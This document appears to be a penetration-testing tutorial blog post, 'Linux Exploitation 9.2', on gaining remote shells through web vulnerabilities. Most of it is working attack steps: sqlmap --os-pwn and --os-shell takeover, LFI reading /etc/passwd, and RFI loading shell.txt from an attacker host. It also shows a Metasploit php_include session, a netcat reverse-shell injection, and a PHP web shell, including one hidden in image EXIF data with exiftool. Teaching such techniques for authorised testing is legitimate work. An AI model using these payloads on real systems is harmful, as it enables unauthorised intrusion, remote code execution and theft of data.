---
layout: post
published: true
title: Linux Exploitation 9.2
tags:
  - PWP
  - Intermediate
  - Linux Exploitation
comments: true

---
## Web Exploitation


## Introduction

_**In this blog post we will learn about web exploitation to get remote shell on target system, we will exploit some vulnerabilities that are able to compromise target system, like SQLi, File incusion, Command injection, File Upload.**_



Before this, i want to explain you some basics about shells.

** Reverse Shell and Bind Shell

**Bind shell**

Its a type of shell in which the target machine set a listner or opens up a connection on target machine and waits for an incoming 
request of connection. 


**Reverse shell**

Its opposite to bind shell, in reverse shell target machine requests back to attacker machine that listining a connection, to set a connection. In reverse shell, attacker machine listens for connection.


The basic use of both of them is to take access on the target system, to exxecute and perform malicious actions on target.


**Web Backdoor**

A web backdoor is the attacker's uploadeded script on the target web application to get remote access on target.


**SQL injection**

SQL injection is type of attack in which attacker is able to inject his arbitrary SQL queries as an input, in order to get his desired output as result.

The reason behind this vulnerability is improper input sanitization and trust on user supplied input.

It not only affect web application even it can compromise web server also.

We will exploit SQLi to get access to target system. We will use SQL map for this purpose, there are also many manual options to server takeover that we will discuss later.


**Sqlmap**

It's a powerfull sql injection tool used to exploit types of SQL vulnerabilities automatically in target system.

```
# man sqlmap
```

```
# sqlmap -h
```


_Sqlmap comes preconfigured in ParrotOS_


Suppose you find sql vulnerability in web application while performing previous phases testing.


And the URL is :

```
https://www.target.com/user/profile?id=1
```
We will use sqlmap to exploit 'id' perameter, as we found its vulnerable to SQLi.

```
# sqlmap -u https://www.target.com/user/profile?id=1 --dbs
```
This will enumerate all databse in and give us valuable result about data stored.

Suppose we got database result:

```
targetcorp
phpmyadmmin
information_schema
mysql
````

Now we got databases, let' use os pwn feature to get the access to web server.

```
# sqlmap -u https://www.target.com/user/profile?id=1 -D targetcorp --os-pwn
```

It will ask you some question like

```
How  do you want to establish the tunnel?
[1] TCP: Metasploit Framework (default)
[2] ICMP: icmpsh - icmp tunneling
```
select 1

```
> 1
```

Like this you have to select web application language, select language and after that it will ask you for directory select 1.

After that it will ask for the you want to use, you can use anyone, select 1 for meterpreter, after that it instantly load Metasploit framework  and give you meterpreter shell.


We can also use other sqlmap feature also name '--os-shell'

```
# sqlmap -u https://www.target.com/user/profile?id=1 -D targetcorp --os-shell
```

**File Inclusion Vulnerability**

There are two types of file inclusion vulnerabilities **Local File Inclusion** and **Remote File Inclusion**, depending on where the file to include is located.

The reason behind this vulnerability is 'include()' function, where path characters are not stripped from input and the input is used as part of an 'include().

**Exploiting Local File Inclusion**

In LFI we can include any local file on web page.

Suppose in previous phases we found an URL is vulnerable to LFI, Now we are going to exploit it.

```
URL: http://targetcorp.com/index.php?file=welcome.php
```

Let's change the URL to our aribitrary file include URL.

```
URL: http://targetcorp.com/index.php?file=../../../etc/passwd
```

It will include all the content of `/etc/passwd` file on webpage.

Like this you can include any file, and see the content of that file.



**Exploitation of Remote File Inclusion**

In RFI we can include any remote file and execute it instead of only inclusion.


In previous phases we found an url that is vulnerable to RFI.

```
URL: http://targetcorp.com/vuln.php?file=
```
As you can see the parameter 'file' is vulnerable to RFI, and we can leaverage it remote code execution in target system.

To exploit this vulnerability we must not include 'php' file in our attacker server, otherwise it will execute it in attacker server.

We can simple change the file extension to '.txt' and include it in target URL, Like this.

```
http://targetcorp.com/vuln.php?file=atacker.com/shell.txt
```
**We can also use metasploit to exploit these vulnerabilities.**

```
msf5 > use exploit/unix/webapp/php_include
msf5 exploit(unix/webapp/php_include) > show options
```

It will give options to set, you need to set only few of them which are required



```
msf5 exploit(unix/webapp/php_include) > set path vuln.php?file=
path => vuln.php?file=
msf5 exploit(unix/webapp/php_include) > set rhost 10.10.10.123
rhost => 10.10.10.123
msf5 exploit(unix/webapp/php_include) > set rport 443
rport => 443
msf5 exploit(unix/webapp/php_include) > show payloads
msf5 exploit(unix/webapp/php_include) > set payload php/bind_php
payload => php/bind_php
msf5 exploit(unix/webapp/php_include) > run
```

Boom, you will get meterpreter shell instantly.


**Exploiting Command injection**

Command injection is the vulnerabilty, that use user input to excute arbitrary commands on web server.  It can also execute attacker's payload on host system.



In previous we have found command injection on target web application, now we will exploit it and get reverse shell.

The vulnerable input field is taking IP addresses as input to test their speed, so we will exploit this functionality. 

we will first start netcat listener in attackers system

In attacker's machine
```
# nc -lvp 1337
```

In target application's input field
```
& nc <attacker IP> 4444 -e /bin/bash
```
 And you will get reverse shell of target system.
 
 
 
 
**Exploiting File Upload Vulnerability**
 
The Unrestricted file upload vulnerabilty allow an attacker to upload his malicious file on target web server and compromise target in attacker's desired way.


The reason behind it, is not implementing restriction on files uploaded by the user.

In previous phases we have found Unrestricted file upload vulnerability on target web application.


We have a web page which allow us to upload an image 

```
http://target.com/uploadpicture.php
```
And if we upload image the image will available on following url

```
http://target.com/pictures/<imagename>
```

we can easily upload our php backdoor and get remote code execution from it

create a php file with following code and uplaod it on target web

```
<?php echo "<pre>"; system($_GET['cmd']); ?>
```

```
http://target.com/pictures/hackershell.php?cmd=ls
```  

Suppose their is restriction, we can only upload image files, and web applications is also checking for file content so we also 
cant upload file after simply changing its extension.


Now we can use exiftool

```
# man exiftool
```
To make a exif payload we simply append our code to the image

```
# exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' hackershell.jpg
```

And copy file to

```
cp hackershell.jpg hackershell.php.jpg
```
Now you can upload it succesfully

```
http://target.com/pictures/hackershell.php?cmd=ls
```


We can create payloads using msfvenom like we create in previous modules, or we can also use metasploit framework for every attack above.



## Conclusion

_**We have discussed some web application's high potential vulnerabilities exploitation, As its not a web pentesting series, we will learn more in upcoming web application pentesting blog series.And the web approaches are the mostly same for both linux and windows.**_














































 
 
 
 
 
 
 
 






























































































